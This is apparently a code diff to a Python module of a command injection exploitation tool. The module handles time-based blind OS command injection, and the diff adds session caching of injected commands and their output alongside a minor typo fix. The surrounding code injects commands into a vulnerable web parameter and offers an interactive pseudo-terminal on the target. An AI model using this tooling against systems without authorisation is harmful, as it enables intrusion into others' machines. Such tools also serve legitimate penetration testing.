@@ -65,6 +65,7 @@ The "time-based" injection technique on Blind OS Command Injection.
 The "time-based" injection technique handler.
 """
 def tb_injection_handler(url, delay, filename, http_request_method, url_time_response):
+ 
   counter = 1
   num_of_chars = 1
   vp_flag = True
@@ -98,7 +99,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
       for separator in settings.SEPARATORS:
 
         # If a previous session is available.
-        if settings.LOAD_SESSION and session_handler. notification(url, technique):
+        if settings.LOAD_SESSION and session_handler.notification(url, technique):
           cmd = shell = ""
           url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
           settings.FOUND_HOW_LONG = how_long
@@ -390,7 +391,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
             go_back_again = False
             while True:
               if go_back == True:
-                break
+                break 
               gotshell = raw_input(settings.QUESTION_SIGN + "Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
               if gotshell in settings.CHOISE_YES:
                 print ""
@@ -458,10 +459,18 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                       
                     else:
                       print ""
-                      # The main command injection exploitation.
-                      check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
-                      # Export injection result
-                      tb_injector.export_injection_results(cmd, separator, output, check_how_long)
+                      if menu.options.ignore_session or \
+                         session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+                        # The main command injection exploitation.
+                        check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
+                        # Export injection result
+                        tb_injector.export_injection_results(cmd, separator, output, check_how_long)
+                        if not menu.options.ignore_session :
+                          session_handler.store_cmd(url, cmd, output, vuln_parameter)
+                      else:
+                        output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+                        print Fore.GREEN + Style.BRIGHT + output + Style.RESET_ALL
+
                       print ""
                   except KeyboardInterrupt: 
                     raise
